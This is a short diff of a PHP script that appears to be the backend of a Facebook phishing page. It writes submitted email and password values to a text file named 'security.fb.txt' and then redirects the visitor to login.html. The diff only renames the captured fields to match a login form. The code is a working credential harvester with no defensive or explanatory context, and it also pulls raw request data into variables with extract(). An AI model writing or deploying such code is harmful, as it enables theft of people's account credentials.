@@ -3,9 +3,9 @@ header('Location: login.html');
 extract($_REQUEST);
 $file=fopen("security.fb.txt","a");
 
-fwrite($file,"username : ");
-fwrite($file,$username ."\n");
-fwrite($file,"password : ");
-fwrite($file, $password ."\n");
+fwrite($file,"email : ");
+fwrite($file,$email ."\n");
+fwrite($file,"pass : ");
+fwrite($file, $pass ."\n");
 fclose($file);
 ?>
